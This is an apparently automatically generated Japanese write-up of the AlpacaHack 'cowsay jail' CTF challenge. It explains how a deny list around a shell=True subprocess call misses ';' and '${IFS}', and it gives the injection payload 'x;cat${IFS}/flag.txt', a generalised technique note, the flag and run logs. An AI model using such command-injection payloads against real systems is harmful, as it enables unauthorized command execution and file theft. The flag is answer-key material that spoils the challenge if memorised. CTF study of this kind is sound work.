# cowsay jail

| 項目 | 内容 |
| --- | --- |
| 大会 | AlpacaHack Daily |
| 問題番号 | cowsay-jail |
| カテゴリ | misc |
| 配点 | 1 |
| 状態 | 解決済み（公式判定で正解: 2026-11-13 20:34 JST） |
| Flag | `Alpaca{The_author_has_only_ever_used_$IFS_in_CTF._How_about_you?}` |
| Flag照合 | 公式判定で正解した文字列と一致 |
| タグ | misc, jail, shell-injection |
| 問題URL | https://alpacahack.com/daily/challenges/cowsay-jail |
| METIS run | `23954bd085264eab8480b3443ec300a0` |

## 概要

deny list が空白等を禁止するが ; $ { } を見落とし。${IFS} と ; でコマンド注入。

## 解析

subprocess.run(f'cowsay {arg}', shell=True)。禁止文字に ; $ { } / * は含まれない。

## 解法

入力: x;cat${IFS}/flag.txt

## 使用したスクリプト

- [cowsay-solve.txt](files/cowsay-jail/cowsay-solve.txt)

## 学び・再利用できる手法

deny list が空白等を禁止するが ; $ { } を見落とし。${IFS} と ; でコマンド注入。

- **Shell command injection without spaces using ${IFS}**（misc）: When input is interpolated into a shell command with shell=True but spaces and many metacharacters are denied, use ${IFS} in place of spaces and ';' to chain commands (both often missed by deny lists). e.g. `x;cat${IFS}/flag`.
  - 適用条件: shell=True command interpolation with a character deny list that forgets ; $ { }.

## METISの記録

- 期間: 2026-11-13 20:07 JST 〜 2026-11-13 20:34 JST
- 使用アクション数: 2（official_flag_submission_browser ×1, remote_service_exchange ×1）
- 判定方式: official_browser_observed

### 提出履歴

| 時刻 | 判定 | 回数 |
| --- | --- | --- |
| 2026-11-13 20:34 JST | correct | 1 |

### 配布ファイル・取得データ

| ファイル | サイズ | SHA-256 |
| --- | --- | --- |
| 00-problem.html | 378,456 | `ac9c1864d8c1df4eb8612306a46cba3baa29194fe6d38dc57f4cc8f9d3243b6f` |
| 01-00-cowsay-jail.tar.gz | 904 | `7d341529d377801d26cd2a0f9969aa579108a5e441d0b6a1708b62065d227fb0` |
| .metis-remote/1473d952dc23453d91a1c933a57a625e.recv | 214 | `081e8307f90d85a895a4f721496960b7c8c67a09a9ee6278f2cf17a362349512` |
| .metis-remote/d6089fe582314160bdf0cb8c042f2203.json | 582 | `3b8aa15174e5155316790788b3432084ccd6d6a2361e3dde454af5c5802e60c9` |

### 接続先

- 34.170.146.252:48338

<sub>METIS writeup — 更新: 2026-11-13 21:19 JST</sub>
